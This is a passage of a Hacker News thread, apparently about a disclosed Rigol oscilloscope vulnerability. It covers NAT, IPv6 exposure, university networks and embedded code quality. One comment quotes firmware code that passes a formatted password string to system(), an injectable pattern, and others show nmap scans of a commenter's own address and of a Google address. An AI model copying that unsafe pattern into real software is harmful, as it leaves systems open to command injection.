doesn't change anything. | | --- | --- | --- | | | |  |  | [kriive](user?id=kriive) [on July 17, 2023](item?id=36759279)   | [root](#36747560) | [parent](#36748200) | [prev](#36748361) | [next](#36750153) [–]  Yeah, I agree that 13 days from the last contact was maybe a bit too fast. But they haven't replied to this day and I reported the vuln two months earlier without response! P.S. sorry for the american time dates, I don't know what I was thinking lol. | | --- | --- | --- | | | |  |  | [jacquesm](user?id=jacquesm) [on July 16, 2023](item?id=36750153)   | [root](#36747560) | [parent](#36748200) | [prev](#36759279) | [next](#36748601) [–]  I prefer to use dd/mmm/yyyy with mmm like jan/feb/mar etc that takes care of all confusion and seems to be understood the world over. This saves me from having to adopt some local convention depending on who I'm invoicing. | | --- | --- | --- | | | |  |  | [mschuster91](user?id=mschuster91) [on July 16, 2023](item?id=36751885)   | [root](#36747560) | [parent](#36750153) | [next](#36748601) [–]  Problem is you can't sort in that order. | | --- | --- | --- | | | |  |  | [jacquesm](user?id=jacquesm) [on July 16, 2023](item?id=36751917)   | [root](#36747560) | [parent](#36751885) | [next](#36748601) [–]  I don't think anybody reading my invoices will have trouble interpreting them, and if they need to sort then they're welcome to add their own version of the date. But at least there will be no ambiguity about when I sent the invoice. | | --- | --- | --- | | | |  |  | [starlevel003](user?id=starlevel003) [on July 16, 2023](item?id=36748601)   | [root](#36747560) | [parent](#36748200) | [prev](#36750153) | [next](#36747836) [–]  > By the way, could at least us developers use ISO dates instead of whatever our local conventions are? 2023-28 and 2023-39 aren't any more readable. | | --- | --- | --- | | | |  |  | [ooterness](user?id=ooterness) [on July 16, 2023](item?id=36748701)   | [root](#36747560) | [parent](#36748601) | [next](#36747836) [–]  Usually when people say ISO8601, they mean "2023-07-12T09:20:00Z". But the actual spec, which no one reads because it costs money to access, allows dozens of other variations. (Too many IMHO.) RFC3339 is compatible with "the good parts" of ISO8601 and it's also free. <https://www.rfc-editor.org/rfc/rfc3339> | | --- | --- | --- | | | |  |  | [mulmen](user?id=mulmen) [on July 16, 2023](item?id=36749715)   | [root](#36747560) | [parent](#36748701) | [next](#36747836) [–]  I interpret "ISO 8601" to be "lexicographically sortable in chronological order" or maybe "big endian". | | --- | --- | --- | | | |  |  | [SV\_BubbleTime](user?id=SV_BubbleTime) [on July 16, 2023](item?id=36747836)   | [root](#36747560) | [parent](#36747715) | [prev](#36748200) | [next](#36751099) [–]  This sounds like Rigol and Siglent. Very impressive hardware for the price, questionable support and software. | | --- | --- | --- | | | |  |  | [nimish](user?id=nimish) [on July 16, 2023](item?id=36751941)   | [root](#36747560) | [parent](#36747836) | [next](#36751099) [–]  Siglent seems to be moving upmarket at least. Rigol has wildly good on paper hardware but their software is suspect. Rigol made their own ADC chip that beats most off the shelf stuff yet they have some of the jankiest software and English translation known to man. | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [on July 16, 2023](item?id=36751099)   | [prev](#36747560) | [next](#36751958) [–]   ```     sprintf(&CMD_BUF,"echo admin:%s > %s",pass1,path);     system(&CMD_BUF);  ``` You've probably heard of useless use of cat, but this is a useless use of echo. Given that the code even opens the file in question several lines above, I'm surprised that the author didn't know about fprintf. | | --- | --- | --- | | | |  |  | [nimish](user?id=nimish) [on July 16, 2023](item?id=36751958)   | [prev](#36751099) | [next](#36747059) [–]  Lots of these tools have truly awful software engineering. Even companies that are top, premium brands have some really questionable decisions like embedding backdoor passwords in the firmware. Never connect these things to the internet or any untrusted network. Last thing you need is a 10k instrument bricking itself. | | --- | --- | --- | | | |  |  | [veave](user?id=veave) [on July 16, 2023](item?id=36747059)   | [prev](#36751958) | [next](#36750991) [–]  I wonder who goes around thinking "I'm going to expose an oscilloscope to the WAN!". Something you have to do on purpose, taking lots of extra steps, because of CG-NAT. Kinda asking for it. | | --- | --- | --- | | | |  |  | [mschuster91](user?id=mschuster91) [on July 16, 2023](item?id=36747118)   | [parent](#36747059) | [next](#36747259) [–]  Many universities give everyone on their network a fully routed IP address, at least this was the case ten-ish years ago for me in Germany. Was ideal if you were developing something and showing it off to someone at the other end of the campus while being on the phone or Teamspeak - just give the other person your IP address and spin up a server at 8080, that's it. Besides, if I were on a red team, I'd enumerate all devices on the LAN as well. Simply to look for all that old cruft someone set up years ago and never updated... that's where you get persistence. No one goes and checks 'scopes, network gear or printers for indicators of compromise in their firmware, because no one thinks of them if the admin isn't looking for outgoing Internet traffic. | | --- | --- | --- | | | |  |  | [Aurornis](user?id=Aurornis) [on July 16, 2023](item?id=36747519)   | [root](#36747059) | [parent](#36747118) | [next](#36747586) [–]  > Many universities give everyone on their network a fully routed IP address, at least this was the case ten-ish years ago for me in Germany Times have changed a lot in the past decade. No reasonable network admin would be giving public IPs to everything that connects to the network any more. IPv4 addresses are also scarce relative to a decade ago. | | --- | --- | --- | | | |  |  | [cyrnel](user?id=cyrnel) [on July 16, 2023](item?id=36747807)   | [root](#36747059) | [parent](#36747519) | [next](#36748245) [–]  Routable IPs aren't the problem here. In fact under IPv6 you generally would give devices routable IPs. NAT is not a security mechanism. Instead, you should put a default-deny rule on your firewall for all incoming traffic to user devices (which is generally the default setting anyway). | | --- | --- | --- | | | |  |  | [YakBizzarro](user?id=YakBizzarro) [on July 16, 2023](item?id=36748245)   | [root](#36747059) | [parent](#36747519) | [prev](#36747807) | [next](#36749036) [–]  Trust me, it's not the case. I sell electronic instruments for laboratories, and in the large majority of the cases they are simply attacched to the local network. And such network has simply internet access. I once made a blogpost to advise our customers how to create a local instruments network for higher performances and security, but I don't know how much impact it had | | --- | --- | --- | | | |  |  | [luma](user?id=luma) [on July 16, 2023](item?id=36749036)   | [root](#36747059) | [parent](#36747519) | [prev](#36748245) | [next](#36747911) [–]  You are forgetting that many universities (at least in the US) are sitting on enormous allocations of address space due to being early users of the technology from DARPA. Coupled with "NAT isn't a firewall", assigning actual IPs to your end devices isn't all that silly if you happen to have a few million to spare. | | --- | --- | --- | | | |  |  | [jerzmacow](user?id=jerzmacow) [on July 16, 2023](item?id=36747911)   | [root](#36747059) | [parent](#36747519) | [prev](#36749036) | [next](#36750450) [–]  As of a year ago, the major university I worked at still does this | | --- | --- | --- | | | |  |  | [mr\_mitm](user?id=mr_mitm) [on July 16, 2023](item?id=36748285)   | [root](#36747059) | [parent](#36747911) | [next](#36748201) [–]  I talked to the security person at a German university a few years ago and suggested that they put some restrictive firewall rules in place to increase security. He agreed with me in principle, but lamented the fact that the grey beards in the university's network administrator team follow a philosophy which says that networks need (or want?) to be free. | | --- | --- | --- | | | |  |  | [SoftTalker](user?id=SoftTalker) [on July 16, 2023](item?id=36748201)   | [root](#36747059) | [parent](#36747911) | [prev](#36748285) | [next](#36750450) [–]  Yeah IPv4 addresses are not scarce at many (some?) big universities | | --- | --- | --- | | | |  |  | [kjs3](user?id=kjs3) [on July 16, 2023](item?id=36750450)   | [root](#36747059) | [parent](#36747519) | [prev](#36747911) | [next](#36747641) [–]  IPv4 exhaustion isn't nearly the issue for universities that it is elsewhere. Most unis grabbed a large allocation early on, before it was an issue. Many have multiple class B allocations; quite a few have As. | | --- | --- | --- | | | |  |  | [don-code](user?id=don-code) [on July 16, 2023](item?id=36747641)   | [root](#36747059) | [parent](#36747519) | [prev](#36750450) | [next](#36747761) [–]  Sadly, to my current understanding, my alma mater still does this. At the time it was extremely convenient - we had labs full of Solaris and Linux boxes, which could be remotely accessed from home without any issue. And I also seem to remember that basically nothing on IT's part had to be done during the Xbox 360 / Xbox Live craze, unlike my peers at other schools. Even then, though, the downsides of consumer network security (mostly) relying on NAT were obvious. Common ports (80, 25, etc) were blocked inbound; the school's printers basically had to be on their own network, or get spammed all day. | | --- | --- | --- | | | |  |  | [justsomehnguy](user?id=justsomehnguy) [on July 16, 2023](item?id=36747761)   | [root](#36747059) | [parent](#36747519) | [prev](#36747641) | [next](#36747900) [–]  > No reasonable network admin You are speaking about academia. It's not mutually exclusive, but it's *different* then out there in the wild. | | --- | --- | --- | | | |  |  | [natebc](user?id=natebc) [on July 16, 2023](item?id=36747885)   | [root](#36747059) | [parent](#36747761) | [next](#36747900) [–]  Most of the staff/admins in the universities that I've worked in have relatively modern sensibilities when it comes to this stuff. However, their constituents, particularly on the academic sides of the house ... less so. I've heard a modest firewall policy argued against on the grounds of Academic Freedom, let alone private IP addresses. It is indeed a different environment. | | --- | --- | --- | | | |  |  | [bee\_rider](user?id=bee_rider) [on July 16, 2023](item?id=36748786)   | [root](#36747059) | [parent](#36747885) | [next](#36747900) [–]  There are so many devices on a campus network with nebulous ownership set up by clever but still-learning grad students and even undergrads, trying to secure the perimeter seems pointless. Someone internal will find a way to get hacked, or even themselves could be malicious (what are we going to do, background check every student?), so all the nodes on the network need to themselves be secured. | | --- | --- | --- | | | |  |  | [sva\_](user?id=sva_) [on July 16, 2023](item?id=36747900)   | [root](#36747059) | [parent](#36747519) | [prev](#36747761) | [next](#36747586) [–]  I can confirm that it is completely normal at German universities as of today. You can setup your own router at home if you so desire | | --- | --- | --- | | | |  |  | [tetris11](user?id=tetris11) [on July 16, 2023](item?id=36747586)   | [root](#36747059) | [parent](#36747118) | [prev](#36747519) | [next](#36747259) [–]  This is still the case I think, though admins now restrict the access for sensitive equipment. My work laptop's ethernet has a fully public ip4, for example. | | --- | --- | --- | | | |  |  | [retrac](user?id=retrac) [on July 16, 2023](item?id=36747259)   | [parent](#36747059) | [prev](#36747118) | [next](#36747472) [–]  In the era of IPv6 you can't assume that your device is implicitly firewalled for incoming connections. My smartphone currently has a public IPv6 address from my relative's home wifi network. | | --- | --- | --- | | | |  |  | [irdc](user?id=irdc) [on July 16, 2023](item?id=36747573)   | [root](#36747059) | [parent](#36747259) | [next](#36747562) [–]  But have you actually tested connecting to it from outside the network? Just because something has a public IPv6 address doesn't mean there isn't a firewall somewhere in between. It just means there's no NAT. | | --- | --- | --- | | | |  |  | [tomrod](user?id=tomrod) [on July 16, 2023](item?id=36747562)   | [root](#36747059) | [parent](#36747259) | [prev](#36747573) | [next](#36748763) [–]  Oh I didn't realize that. How can that be identified and locked down? | | --- | --- | --- | | | |  |  | [thfuran](user?id=thfuran) [on July 16, 2023](item?id=36747588)   | [root](#36747059) | [parent](#36747562) | [next](#36747646) [–]  IPv6 is intended to always use public addresses. If you have an ipv6 address, it's probably public. But that doesn't necessarily mean there's no firewall. | | --- | --- | --- | | | |  |  | [mulmen](user?id=mulmen) [on July 16, 2023](item?id=36747646)   | [root](#36747059) | [parent](#36747562) | [prev](#36747588) | [next](#36748136) [–]  You can go to <https://whatismyipaddress.com/> and get your public IP then paste it at <https://ipspy.net/nmap> to port scan yourself. | | --- | --- | --- | | | |  |  | [codetrotter](user?id=codetrotter) [on July 16, 2023](item?id=36747949)   | [root](#36747059) | [parent](#36747646) | [next](#36748895) [–]  Your link does not report my public IPv6 address. Only my public IPv4 address. Here is a service that will show you both your public IPv4 and your public IPv6 address. <https://whatismyipaddress.com/> | | --- | --- | --- | | | |  |  | [mulmen](user?id=mulmen) [on July 16, 2023](item?id=36748052)   | [root](#36747059) | [parent](#36747949) | [next](#36748895) [–]  Ah, thanks. I don't have an IPv6 address so I couldn't check. Still, that's the only nmap-in-a-website I'm aware of. There are probably others. Does the nmap scan work on IPv6? That site might actually only be IPv4... | | --- | --- | --- | | | |  |  | [codetrotter](user?id=codetrotter) [on July 16, 2023](item?id=36748250)   | [root](#36747059) | [parent](#36748052) | [next](#36748895) [–]  I tried the online scan that you linked with my IPv6 address. At the end it said Nmap done: 0 IP addresses (0 hosts up) scanned in 2.20 seconds Even though it claims to support IPv6 Also the site spent a whole lot of time showing progress bars and stuff. Whereas when I run Nmap from one of my servers on the internet against my public home IPv6 address ```     % nmap -6 -A -T4 2a0c:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx  ``` I get: ```     Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 17:43 CEST     Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn     Nmap done: 1 IP address (0 hosts up) scanned in 2.23 seconds  ``` So in conclusion yeah, that site you linked was not able to scan IPv6 I think better than that online version of Nmap is to run Nmap from another computer on another IPv6 enabled network against your own public home IPv6 address. Assuming you have additional computers like a server or a VPS, etc. Same way I did. Another possible alternative is to use shodan.io and check what they have found in their past scans for your IP address. Seems that shodan requires creating an account now in order to use it. Not sure if it did before. I remember testing shodan.io a few years ago but don’t remember if I had to create an account then. | | --- | --- | --- | | | |  |  | [mulmen](user?id=mulmen) [on July 16, 2023](item?id=36748331)   | [root](#36747059) | [parent](#36748250) | [next](#36748330) [–]  The site is actually spinning up a VM to run the nmap so those progress bars are real. Thanks for checking. I reached out to the creator and he will update it to work with IPv6. Agree nmap from another machine is best but that's not always an option. I'm thinking like if I am on hotel wifi or something. I might not have easy access to another box. Shodan is a great suggestion. | | --- | --- | --- | | | |  |  | [mr\_mitm](user?id=mr_mitm) [on July 16, 2023](item?id=36748330)   | [root](#36747059) | [parent](#36748250) | [prev](#36748331) | [next](#36748895) [–]  It might just be that your host is blocking all IPv6 probes, as nmap reports, in which case your host would already be in your desired configuration. Also I'd be extremely surprised if Shodan had anything on your IPv6 address. | | --- | --- | --- | | | |  |  | [codetrotter](user?id=codetrotter) [on July 16, 2023](item?id=36748358)   | [root](#36747059) | [parent](#36748330) | [next](#36748895) [–]  Notice the difference of their output: Nmap done: 0 IP addresses (0 hosts up) scanned in 2.20 seconds And mine: Nmap done: 1 IP address (0 hosts up) scanned in 2.23 seconds And note that 0 IP addresses scanned is exactly what you get if you run nmap with an IPv6 address as target but without the -6 flag. They probably are doing just that; running nmap without the -6 flag. But let's try something else. ```     % host google.com      google.com has address 142.250.184.14     google.com has IPv6 address 2a00:1450:4003:808::200e     google.com mail is handled by 10 smtp.google.com.      % nmap -6 -A -T4 2a00:1450:4003:808::200e      Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-16 16:53 BST     Nmap scan report for mad06s10-in-x0e.1e100.net (2a00:1450:4003:808::200e)     Host is up (0.032s latency).     Not shown: 998 filtered ports     PORT    STATE SERVICE   VERSION     80/tcp  open  http      gws     [...]     Nmap done: 1 IP address (1 host up) scanned in 76.10 seconds  ``` And now try putting 2a00:1450:4003:808::200e into their web tool and see what they report. At the moment their website will get 0 addresses scanned for that as well. Nmap done: 0 IP addresses (0 hosts up) scanned in 1.58 seconds | | --- | --- | --- | | | |  |  | [backendanon](user?id=backendanon) [on July 16, 2023](item?id=36748895)   | [root](#36747059) | [parent](#36747646) | [prev](#36747949) | [next](#36748136) [–]  I prefer <https://www.whatsmyip.org/> | | --- | --- | --- | | | |  |  | [vel0city](user?id=vel0city) [on July 16, 2023](item?id=36748136)   | [root](#36747059) | [parent](#36747562) | [prev](#36747646) | [next](#36748763) [–]  Firewalls. In the network path. On the device. They control what packets get allowed or denied. | | --- | --- | --- | | | |  |  | [Roark66](user?id=Roark66) [on July 16, 2023](item?id=36748763)   | [root](#36747059) | [parent](#36747259) | [prev](#36747562) | [next](#36747472) [–]  I wish we lived "in the era of ipv6". Unfortunately one of the biggest mobile providers in my country (and the only one available to me at reasonable speed) has no ipv6 setup. Also, they NAT their entire network. So, to have any way to connect back to my home network I have to run a permanent vpn to a server in aws and connect to that. | | --- | --- | --- | | | |  |  | [sho\_hn](user?id=sho_hn) [on July 16, 2023](item?id=36747472)   | [parent](#36747059) | [prev](#36747259) | [next](#36747882) [–]  Probably quite a few people who want to remote-monitor a test setup? The web interface is one of the selling points. | | --- | --- | --- | | | |  |  | [1970-01-01](user?id=1970-01-01) [on July 16, 2023](item?id=36747882)   | [parent](#36747059) | [prev](#36747472) | [next](#36747530) [–]  Exactly! I don't see anything on shodan. (I didn't look very hard, however.) | | --- | --- | --- | | | |  |  | [dec0dedab0de](user?id=dec0dedab0de) [on July 16, 2023](item?id=36747530)   | [parent](#36747059) | [prev](#36747882) | [next](#36750991) [–]  All the people against NAT/PAT and hyping up v6 as a way to get rid of it. | | --- | --- | --- | | | |  |  | [NavinF](user?id=NavinF) [on July 16, 2023](item?id=36747668)   | [root](#36747059) | [parent](#36747530) | [next](#36749117) [–]  That's unrelated. Any firewall can block incoming connections without the massive performance penalty of NAT | | --- | --- | --- | | | |  |  | [backendanon](user?id=backendanon) [on July 16, 2023](item?id=36748964)   | [root](#36747059) | [parent](#36747668) | [next](#36748183) [–]  There's no performance penalty for NAT that I'm aware of, I'd like to hear more about this. IPv6 OTOH has enough privacy busting concerns that I personally will never use it on my home systems. Trying to use only IPv4 on a smart phone though causes various connectivity issues, I've tried it. Google does own Android and wants to make sure they know as much about what we do on our phones as possible. | | --- | --- | --- | | | |  |  | [shrubble](user?id=shrubble) [on July 16, 2023](item?id=36748183)   | [root](#36747059) | [parent](#36747668) | [prev](#36748964) | [next](#36749117) [–]  What performance penalty does NAT entail? Even low end home routers have built-in NAT on the chip, no cpu is used for NATting. | | --- | --- | --- | | | |  |  | [NavinF](user?id=NavinF) [on July 16, 2023](item?id=36750203)   | [root](#36747059) | [parent](#36748183) | [next](#36748342) [–]  > low end home routers have built-in NAT on the chip Low end home routers have tiny connection tracking tables and fall back to software routing when that table overflows. IMO if you don't notice the massive drop in performance when this happens, you have very low standards/expectations for internet latency. In had to upgrade to a prosumer router just to get acceptable perf on IPv4 | | --- | --- | --- | | | |  |  | [garaetjjte](user?id=garaetjjte) [on July 16, 2023](item?id=36748342)   | [root](#36747059) | [parent](#36748183) | [prev](#36750203) | [next](#36752454) [–]  Virtually all SOHO routers do routing on CPU. | | --- | --- | --- | | | |  |  | [nwallin](user?id=nwallin) [on July 16, 2023](item?id=36750121)   | [root](#36747059) | [parent](#36748342) | [next](#36752454) [–]  If you're going to do SOHO routing safely/correctly, you'll need to do some sort of connection tracking. You'll need to allow packets on new and existing outbound connections, but only allow incoming packets on existing connections. SOHO routers generally won't support this in hardware, so you have to route on the CPU anyway. NAT on IPv4 vs stateful routing on IPv6 is a wash in terms of performance. | | --- | --- | --- | | | |  |  | [A1kmm](user?id=A1kmm) [on July 16, 2023](item?id=36752454)   | [root](#36747059) | [parent](#36748183) | [prev](#36748342) | [next](#36749117) [–]  I'm thinking maybe they meant performance impact on peer-to-peer protocols like WebRTC, where if both sides are behind NAT, you might end up routing traffic between two local devices with a NAT gateway between them through a remote TURN server to establish connectivity. | | --- | --- | --- | | | |  |  | [starfallg](user?id=starfallg) [on July 16, 2023](item?id=36749117)   | [root](#36747059) | [parent](#36747530) | [prev](#36747668) | [next](#36750991) [–]  NAT is and always was a massive band-aid for the lack of public IPv4 addressing. | | --- | --- | --- | | | |  |  | [cedws](user?id=cedws) [on July 16, 2023](item?id=36750991)   | [prev](#36747059) | [next](#36751571) [–]  How are developers still screwing this up? Is it negligence or stupidity? They shouldn't be allowed to work in industry writing bad code like this. Security vulns happen, but come on, this is the basics. | | --- | --- | --- | | | |  |  | [epcoa](user?id=epcoa) [on July 16, 2023](item?id=36751341)   | [parent](#36750991) | [next](#36814024) [–]  You know how much embedded dev pays? It’s shit. People that are good are usually good enough to go write some Java crud apps and make 3x as much. Unlike the games industry there isn’t nearly as many people drawn to writing the shitware on a consumer router or cut rate oscilloscope. | | --- | --- | --- | | | |  |  | [cedws](user?id=cedws) [on July 16, 2023](item?id=36751537)   | [root](#36750991) | [parent](#36751341) | [next](#36814024) [–]  I have no qualms with "acting your wage." This goes below the minimum bar in my opinion. Real engineers don't get away with fuckups with real consequences because of their salary. | | --- | --- | --- | | | |  |  | [epcoa](user?id=epcoa) [on July 18, 2023](item?id=36767471)   | [root](#36750991) | [parent](#36751537) | [next](#36814024) [–]  > This goes below the minimum bar in my opinion. I'm not giving you a justification, I'm telling you how it is. > Real engineers don't get away with fuckups with real consequences because of their salary. I mean they absolutely do. What is a "real" engineer anyway? I am a licensed engineer (electrical) because I used to work independently as an engineering firm. I understand the various definitions. The overwhelming majority of those with a title of electrical or computer engineer do not have any kind of professional licensure or certification - at best they may have an accredited 4 year degree. None of these people are going to be personally liable for fuckups of any kind in their careers. | | --- | --- | --- | | | |  |  | [sidewndr46](user?id=sidewndr46) [on July 21, 2023](item?id=36814024)   | [parent](#36750991) | [prev](#36751341) | [next](#36751571) [–]  As others have mentioned, the pay and the incentives for producing quality embedded software is non existent. Just last year I casually inspected and found an RCE in a decade old consumer product just sitting there in plain sight: [http://www.hydrogen18.com/blog/hacking-zyxel-ip-cameras-pt-1...](http://www.hydrogen18.com/blog/hacking-zyxel-ip-cameras-pt-1.html) | | --- | --- | --- | | | |  |  | [Const-me](user?id=Const-me) [on July 16, 2023](item?id=36751571)   | [prev](#36750991) | [next](#36747636) [–]  It seems the device embeds a conventional ARM Linux. If I were developing embedded software for a device like that, I would have used asp.net core runtime. It’s *much* easier to create secure web apps using C#, compared to cgi-bin written in C for lighthttpd web server. | | --- | --- | --- | | | |  |  | [StayTrue](user?id=StayTrue) [on July 16, 2023](item?id=36747636)   | [prev](#36751571) | [next](#36748062) [–]  As a separate issue, it’s strange the firmware pkg is not encrypted. | | --- | --- | --- | | | |  |  | [luma](user?id=luma) [on July 16, 2023](item?id=36749092)   | [parent](#36747636) | [next](#36747671) [–]  Rigol is pretty famous for not really caring a single bit about security. It's helpful in one particular area, in that they sell the device in the OP for anywhere between $900 and $2900 depending on which features are enabled, except all of those features are software locked with the same attention to security as they do everything else. The result is that you can get a hell of a lot of scope for very little money, but don't expect it to offer things like "robust security". | | --- | --- | --- | | | |  |  | [mardifoufs](user?id=mardifoufs) [on July 16, 2023](item?id=36747671)   | [parent](#36747636) | [prev](#36749092) | [next](#36748062) [–]  Why is it an issue? Is it to make sure that the right firmware is loaded? I always thought encrypted firmwares were mostly a form of lock in. | | --- | --- | --- | | | |  |  | [m4rtink](user?id=m4rtink) [on July 16, 2023](item?id=36747752)   | [root](#36747636) | [parent](#36747671) | [next](#36748062) [–]  Yeah - if anything, you could sign it and/or checksums it. Encryption indeed sounds like lock-in. | | --- | --- | --- | | | |  |  | [ChrisMarshallNY](user?id=ChrisMarshallNY) [on July 16, 2023](item?id=36748062)   | [prev](#36747636) | [next](#36748009) [–]  Awesome detective work! That's the kind of thing that makes this site special. | | --- | --- | --- | | | |  |  | [\_ugfj](user?id=_ugfj) [on July 16, 2023](item?id=36748009)   | [prev](#36748062) [–]  Here, I have a better, simpler , all encompassing rule: do not expose anything closed source to the Internet. No, this is not Linux zealotry, I also advocate against using Linux as a daily driver on a modern laptop. The right tool for the right job: OpenWRT on routers, Windows + WSL on laptops. But, you are asking, how do you use your Windows laptop like this when away from home? Easy: GL.iNet has tiny travel routers with OpenWRT supported out of the box. | | --- | --- | --- | | | |  |  | [KeplerBoy](user?id=KeplerBoy) [on July 16, 2023](item?id=36748063)   | [parent](#36748009) | [next](#36748092) [–]  Why would you advocate against Linux on Laptops? If it works just as well and floats my boat, why change to windows? | | --- | --- | --- | | | |  |  | [\_ugfj](user?id=_ugfj) [on July 16, 2023](item?id=36749130)   | [root](#36748009) | [parent](#36748063) | [next](#36748092) [–]  <https://news.ycombinator.com/item?id=36678027> | | --- | --- | --- | | | |  |  | [jacquesm](user?id=jacquesm) [on July 16, 2023](item?id=36750176)   | [root](#36748009) | [parent](#36749130) | [next](#36752701) [–]  FWIW I haven't had any hard tech issues with Linux across many different kinds of computers (laptops, desktops, servers, as well as some stuff never intended to run Linux at all such as Macs) and haven't had a serious hardware issue in more than 15 years. The biggest stumbling block was to get Linux installed on an early issue Macbook air just after it came out, other than that not a single glitch. Meanwhile, my family members have issues with their windows boxes every other week or so. I'm sure there are plenty of people that never have a problem with Windows and that can't get Linux to work on their hardware but I'd be careful to generalize from personal experience. | | --- | --- | --- | | | |  |  | [squarefoot](user?id=squarefoot) [on July 17, 2023](item?id=36752701)   | [root](#36748009) | [parent](#36749130) | [prev](#36750176) | [next](#36749370) [–]  For what is worth, last time I encountered compatibility problems wrt Linux on a laptop has been when I was using RedHat 6 or 7 on the cheapest+crappiest Asus laptop I could purchase at that time, and had to recompile kernel and gfx drivers at every update. That happened like 22 years ago, and was 100% the laptop's fault, not Linux, which also worked flawlessly on every laptop I installed later on. | | --- | --- | --- | | | |  |  | [pschastain](user?id=pschastain) [on July 16, 2023](item?id=36749370)   | [root](#36748009) | [parent](#36749130) | [prev](#36752701) | [next](#36749293) [–]  Windows has it's own fun set of problems with drivers: [https://www.esecurityplanet.com/threats/malicious-microsoft-...](https://www.esecurityplanet.com/threats/malicious-microsoft-drivers/) | | --- | --- | --- | | | |  |  | [KeplerBoy](user?id=KeplerBoy) [on July 16, 2023](item?id=36749293)   | [root](#36748009) | [parent](#36749130) | [prev](#36749370) | [next](#36749560) [–]  I agree. Life's too short for fiddling with the OS and i would have wiped PopOs from my Laptop a long time ago if it wouldn't work flawless, but it does (cheap Thinkpad L580). | | --- | --- | --- | | | |  |  | [metalforever](user?id=metalforever) [on July 16, 2023](item?id=36749560)   | [root](#36748009) | [parent](#36749130) | [prev](#36749293) | [next](#36748092) [–]  I don't know bro, I've been installing Linux on random computers (not-preselected) for years and I don't have these problems. | | --- | --- | --- | | | |  |  | [rfoo](user?id=rfoo) [on July 16, 2023](item?id=36748092)   | [parent](#36748009) | [prev](#36748063) | [next](#36748553) [–]  > Easy: GL.iNet has tiny travel routers with OpenWRT supported out of the box. It supports modified OpenWRT with proprietary drivers, which are closed source. Still better than completely black-box travel routers but /shrug. From <https://github.com/gl-inet/glbuilder>: > Since the driver part uses the driver code maintained by many chip manufacturers, we have no right to open it to users. We have tried to provide it to users in the form of ko, but we will always encounter many strange problems. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [on July 16, 2023](item?id=36748553)   | [parent](#36748009) | [prev](#36748092) | [next](#36748770) [–]  > I also advocate against using Linux as a daily driver on a modern laptop. Why would you do that? | | --- | --- | --- | | | |  |  | [\_ugfj](user?id=_ugfj) [on July 16, 2023](item?id=36749134)   | [root](#36748009) | [parent](#36748553) | [next](#36748770) [–]  <https://news.ycombinator.com/item?id=36678027> | | --- | --- | --- | | | |  |  | [stavros](user?id=stavros) [on July 16, 2023](item?id=36748770)   | [parent](#36748009) | [prev](#36748553) | [next](#36749695) [–]  If you're as right about one as you are about the other recommendation, I might have to start exposing closed-source stuff to the internet. | | --- | --- | --- | | | |  |  | [\_ugfj](user?id=_ugfj) [on July 16, 2023](item?id=36749136)   | [root](#36748009) | [parent](#36748770) | [next](#36749695) [–]  <https://news.ycombinator.com/item?id=36678027> | | --- | --- | --- | | | |  |  | [stavros](user?id=stavros) [on July 16, 2023](item?id=36749243)   | [root](#36748009) | [parent](#36749136) | [next](#36749695) [–]  I've been running Linux on all my computers for years and haven't had problems, so I'm not sure why I'd avoid it. | | --- | --- | --- | | | |  |  | [thefreeman](user?id=thefreeman) [on July 16, 2023](item?id=36749695)   | [parent](#36748009) | [prev](#36748770) [–]  Why would anyone who needs to program willingly choose windows + wsl over macbooks | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |


